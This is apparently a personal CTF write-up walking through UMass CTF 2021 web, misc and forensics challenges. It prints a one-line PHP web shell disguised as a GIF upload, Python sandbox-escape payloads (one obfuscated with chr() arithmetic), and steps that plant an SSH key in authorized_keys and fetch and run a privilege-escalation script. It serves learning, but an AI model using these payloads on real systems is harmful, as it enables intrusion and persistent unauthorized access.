The UMass CTF 2021 is targeted at undergraduate students. The challenges are supposed to be friendly to an amateur like me. I did manage to solve some of them with a lot of effort and learned few tricks along the way.


### 1. <a id="hermit" style="text-decoration:none;">Hermit part 1 [web]</a>

The challenge statement:
> Help henry find a new shell  
> http://104.197.195.221:8086  
> http://34.121.84.161:8086  

![Landing page](/assets/img/umass/hermit/landing.png)

We can see that this website is running on PHP/Apache/Debian. The author suggests a PHP shell upload. Let's check the image upload.    

![Upload page](/assets/img/umass/hermit/upload.png)

The `upload.php` saves my uploaded image to the `/var/www/html/uploads/NFaTbH` path and shows a link to follow it up.

![Show page](/assets/img/umass/hermit/show.png)

The `show.php` dumps the content of my image and sends back it as a base64 image stream. The `filename` query param looks suspicious.  

![Filename param](/assets/img/umass/hermit/filename.png)

This trick works, we have the source code of `upload.php` encoded as a base64 image. Letâ€™s decode it and see the actual code behind it.

![Base64 decode](/assets/img/umass/hermit/decode.png)

```php
<?php
  $target_dir = "uploads/";
  $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
  $filename = tempnam($target_dir, '');
  $uploadOk = 1;
  $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

  // Check file size
  if ($_FILES["fileToUpload"]["size"] > 50000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
  }

  // Allow certain file formats
  if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
  && $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
  }

  // Check if $uploadOk is set to 0 by an error
  if ($uploadOk == 0) {
    echo "<p>Sorry, your file was not uploaded.</p>";
    echo "<a href='/'>Back</a>";
  // if everything is ok, try to upload file
  } else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $filename)) {
      echo "<p>The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])) . " has been uploaded to " . $filename . "</p>";
      $path = "/show.php?filename=" . rawurlencode(basename($filename));
      echo "<a href=$path>See Image</a>";
    } else {
      echo "<p>Sorry, there was an error uploading your file.</p>";
      echo "<a href='/'>Back</a>";
    }
  }
```
A big file or non-image upload is restricted. Looks like a PHP shell as an image will likely pass through. Let's go with a tiny PHP shell.
```bash
echo '<?php system($_GET["c"]); ?>' > test.php.gif
```
![Missing param error](/assets/img/umass/hermit/error.png)
This error indicates that our shell is working and it just need a command to run. Let's search the flag with the  `grep` function.

### 2. <a id="heim" style="text-decoration:none;">Heim [web]</a>

The challenge statement:
> Modern auth for the modern viking  
> http://104.197.195.221:8081  
> http://34.121.84.161:8081

![Landing page](/assets/img/umass/heim/landing.png)

Well from the looks of it I could guess that it is most likely running on python. The challenge is about some sort of authorization tokens.
  
![Authorized page](/assets/img/umass/heim/authorized.png)

![JWT check](/assets/img/umass/heim/jwt.png)

After submitting my name on the page, I received a valid JWT access token and secret key. Let's access the page with a proper header.

![Authorization header](/assets/img/umass/heim/headers.png)

I use the [ModHeader](https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj?hl=en) chrome extension to play with request headers. With the `Authorization: Bearer {my_access_token}` we got a msg.

![Base64 decode](/assets/img/umass/heim/decode.png)

```json
{
  "api":{
    "v1":{
      "/auth":{
        "get":{
          "summary":"Debugging method for authorization post",
          "security":"None",
          "parameters":{
            "access_token":{
              "required":true,
              "description":"Access token from recently authorized Viking",
              "in":"path"
            },
            "jwt_secret_key":{
              "required":false,
              "description":"Debugging - should be removed in prod Heim",
              "in":"path"
            }
          }
        },
        "post":{
          "summary":"Authorize yourself as a Viking",
          "security":"None",
          "parameters":{
            "username":{
              "required":true,
              "description":"Your Viking name",
              "in":"body",
              "content":"multipart/x-www-form-urlencoded"
            }
          }
        }
      },
      "/heim":{
        "get":{
          "summary":"List the endpoints available to named Vikings",
          "security":"BearerAuth"
        }
      },
      "/flag":{
        "get":{
          "summary":"Retrieve the flag",
          "security":"BearerAuth"
        }
      }
    }
  }
}
```

![Flag attempt](/assets/img/umass/heim/attempt.png)

Okay, here we could guess that `Odin` might only be able to access the `/flag` endpoint. So we clear the previous request header and go back to the landing page. Supply the name as `Odin` to get a new access token for `Odin`. Modify the request header as `Authorization: Bearer {odin_access_token}` and access `/flag` endpoint.

### 3. <a id="ekrpat" style="text-decoration:none;">Ekrpat [misc]</a>

The challenge statement:  
> I made so few errors when creating this jail.  
> nc 34.72.64.224 8083  
> nc 35.231.20.75 8083  

![Ekrpat](/assets/img/umass/ekrpat/ekrpat.png)

The `>>>` line beginning looks awfully similar to python interpreter. And the gibberish text is likely to be encoded with substitution ciphers.  
After a bit of `googling`, I eventually landed on a correct webpage to translate the gibberish to something readable. [https://awsm-tools.com](https://awsm-tools.com)

![Decoded message](/assets/img/umass/ekrpat/decoded.png)

After toying with the python3 interpreter and `googling` a bit. I found a workaround for this simple jail escaping challenge.

```python
__builtins__.__dict__['IMPORT'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('ls')
```

![list directory](/assets/img/umass/ekrpat/ls.png)

```python
__builtins__.__dict__['IMPORT'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat flag')
```

![cat flag](/assets/img/umass/ekrpat/cat.png)

### 4. <a id="scan_me" style="text-decoration:none;">Scan me [misc]</a>

The challenge statement:  
> The top layer is a lie.  
> <a href="/assets/img/umass/scanme/scan_me.xcf" download>scan_me.xcf</a>  

Lookup: The XCF, short for eXperimental Computing Facility, is the native image format of the GIMP image-editing program. I don't have the GIMP so I have used an online tool to convert XCF to JPG.

<img src="/assets/img/umass/scanme/scan_me.jpg" alt="Scan me JPG" width="100"/>

This is a QR code recovery challenge. I have done my research on the topic. It is possible with [some tool](https://merricx.github.io/qrazybox/) and effort, one could try to recover the lost data with certain precisions. I have to admit that this has been the finest artwork of mine in a while.

![QR recovery](/assets/img/umass/scanme/art.png)

After signed my fine artwork, [QR & barcode scanner](https://play.google.com/store/apps/details?id=com.gamma.scan&hl=en&gl=US) did the magic and extracted `https://imgur.com/a/57VgQ8M`. Flag was `UMASS{QR-3Z-m0d3}`

### 5. <a id="jeopardy" style="text-decoration:none;">Jeopardy [misc]</a>

The challenge statement:
> This is Jail-pardy!  
> nc 34.72.64.224 8082  
> nc 35.231.20.75 8082  
>  There has been confusion over Miscellaneous 200. The answer is "ios", it is misleading. My bad. Good luck and enjoy! :)

![Jeopardy](/assets/img/umass/jeopardy/jeopardy.png)

So far, I have access to `(){},~:+_<%.1` and `abcdefghi[j][k][l]mno[p]rstuvwxyz`. Not all the questions are answered, but I have to settle with what I have got.
The approach I have used is similar to what worked for the [`ekrpat`](#ekrpat) challenge.
```python
exec('''__builtins__.__dict__['__import__']('os').__dict__['system']('ls')''')
```

These are my workarounds for the characters/letters which I am not allowed to type in:

```python
chr(ord('i')+1) # j
chr(ord('i')+1+1) # k
chr(ord('i')+1+1+1) # l
chr(ord('o')+1) # p
chr(ord(':')+11+11+11) # [
chr(ord('<')+11+11+11) # ]
chr(ord('%')+1+1) # ' - strangely '''text''' failing to escape ' sometimes.
```

I have replaced all the non-allowed letters/characters with my workarounds to constructed the code.

```python
exec(chr(ord('o')+1) + 'rint(__bui' + chr(ord('i')+1+1+1)+ 'tins__.__dict__' + chr(ord(':')+11+11+11) + ''''__im''' + chr(ord('o')+1) + 'ort__' + chr(ord('%')+1+1) + chr(ord('<')+11+11+11) + '''('os').__dict__''' + chr(ord(':')+11+11+11) + ''''system''' + chr(ord('%')+1+1) + chr(ord('<')+11+11+11) + '(' + chr(ord('%')+1+1) + chr(ord('i')+1+1+1) + 's' + chr(ord('%')+1+1) + '))')
```
![list dir](/assets/img/umass/jeopardy/ls.png)

And a minor adjustment to issue the `cat flag.txt` command.

```python
exec(chr(ord('o')+1) + 'rint(__bui' + chr(ord('i')+1+1+1)+ 'tins__.__dict__' + chr(ord(':')+11+11+11) + ''''__im''' + chr(ord('o')+1) + 'ort__' + chr(ord('%')+1+1) + chr(ord('<')+11+11+11) + '''('os').__dict__''' + chr(ord(':')+11+11+11) + ''''system''' + chr(ord('%')+1+1) + chr(ord('<')+11+11+11) + '(' + chr(ord('%')+1+1) + 'cat f' + chr(ord('i')+1+1+1) + 'ag.txt' + chr(ord('%')+1+1) + '))')
```

![cat flag.txt](/assets/img/umass/jeopardy/flag.png)

Yeah, thank you, Alex. I really enjoyed the challenge despite the few hours of struggle.

### 6. <a id="notes" style="text-decoration:none;">Notes [forensics]</a>

The challenge statement:
> The breach seems to have originated from this host. Can you find the user's mistake? Here is a memory image of their workstation from that day.
> File: image.mem (PS: too big to reference)

We have a memory dump to analyze to capture the flag. I came accross this sort of challenge before and remembered the [`volatility`](https://github.com/volatilityfoundation/volatility).

To read the image information. 
```bash
vol.py imageinfo -f ./image.mem

NFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
...
```

To see the process list.
```bash
vol.py pslist --profile=Win7SP1x64 -f ./image.mem

```

To dump the `notepad.exe` memory to file.
```bash
volatility -f ./image.mem --profile=Win7SP1x64 memdump --dump-dir=./ -p 2696
```

To find the flag using `strings` and `grep` functions.
```bash
strings -e l ./2696.dmp| grep "UMASS"
UMASS{$3CUR3_$70Rag3}
```

# 7. <a id="webserver" style="text-decoration:none;">Webserver [forensics]</a>

The challenge statement:
> Our webserver has a few flaws in it :(  
> http://34.72.232.191:8080  
> Link to a file: [a.out](/assets/img/umass/webserver/a.out)

![Landing page](/assets/img/umass/webserver/webserver.png)

![echo endpoint](/assets/img/umass/webserver/message.png)

I don't think my solution is what the author had in mind. After all, he should have given us the `a.out` file for a reason. As soon as I saw the `/echo?message` endpoint I wanted to try a command execution. The dumb luck was on my side, it was a challenge that took the least effort from me.

![Lucky shot](/assets/img/umass/webserver/luck.png)

# 8. <a id="hermit2" style="text-decoration:none;">Hermit - Part 2 [web]</a>

The challenge statement:
> Who are you? How did you get here? You better zip on out of here or else.  
> 104.197.195.221:8087  
> 34.121.84.161:8087  
> (The server is likely not broken. If you really think it's broken, create a support ticket.)

![Landing page](/assets/img/umass/hermit2/landing.png)
![NC](/assets/img/umass/hermit2/nc.png)

My first impression was that this challenge may be out of my league. Initially, I thought there suppose to be a website running behind this ssh interface. So I googled a lot of random stuff like `ssh tunnel`, `ssh proxy` and `ssh firewall` etc ... Well, that was a fruitless few hours. People were solving it with a much better success rate. I read over the challenge statement again after a break. And that's when the `Hermit - Part2`, `Part2` caught my eyes. I began to look at the challenge in a proper way. 
 - Task 1: Get access to the server using `ssh`
 - Task 2: Find the flag or access the local webserver running within server.
And most importantly, I realized that somehow I could use the `hermit` part1 vulnerability to solve the `hermit` part2 challenge. Time to visit back to the `hermit` one. 

To see the debain user name
```bash
whoami
```
![whoami](/assets/img/umass/hermit2/whoami.png)

To check the hermit's default ssh folder hoping to find a usable key pair. (I tried that weird looking `id_ed25519` key but it was password protected.)
```bash
cat /home/hermit/.ssh
```
![ssh keys](/assets/img/umass/hermit2/ssh_keys.png)

To generate a new ssh key pair with no passphrase for myself.

```bash
ssh-keygen -b 2048 -t rsa -f /tmp/mediocre -q -N ""
```
![ssh_keygen](/assets/img/umass/hermit2/ssh_keygen.png)

To get my private key content 

```
cat /tmp/mediocre
```
![get private key](/assets/img/umass/hermit2/private_key.png)

Here, I manually copied my private key content nicely into `hermit.key` file on my local machine and set the proper permission.  

![hermit key](/assets/img/umass/hermit2/hermit_key.png)

To add my public key to the `authorized_keys` file.

```
cat /tmp/mediocre.pub >> /home/hermit/.ssh/authorized_keys
```
![authorized_keys](/assets/img/umass/hermit2/authorized_keys.png)

And tried to access the server via `ssh` through the `8087` port with my keys.
![ssh access](/assets/img/umass/hermit2/access.png)

From here on, I have tried a bunch of useless commands. Failed to find the other webserver which I imagined to be running there somewhere. In the end, I presumed that this is some sort of Linux privilege escalation challenge. While chatting with a friend, I learn about the [`linPEAS script`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and decided to give it a go.

```bash
mkdir /tmp/mediocre_one
cd /tmp/mediocre_one
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh > line.sh
chmod +x line.sh
./line.sh > out
```

The output of the `linPEAS` script had a lot of information so I took a shortcut.

```bash

My successful submissions end here. I spent quite a few hours trying the other challenges:
 - [suckless2] Failed to escape from the jail script written in [Myrddin](https://myrlang.org/) language. 
 - [replme] Failed to figure out the [Janet](https://janet-lang.org/) language `repl` challenge.
 - [malware] Failed to decrypt these encrypted [files](/assets/img/umass/fails/malware.zip) with a python script.
 - [easy as 123] Failed to extract the flag from easy.pcap [30MB] with Wireshark. My suspect was 19 or 36. (forgot)
 - [chicken] Failed to extract anything useful from the [chicken.pdf](/assets/img/umass/fails/chicken.pdf). ([fun source](https://www.youtube.com/watch?v=yL_-1d9OSdk)) 


Anyway, I enjoyed the UMass CTF 2021 event. Thanks to those who organized and sponsored the event.
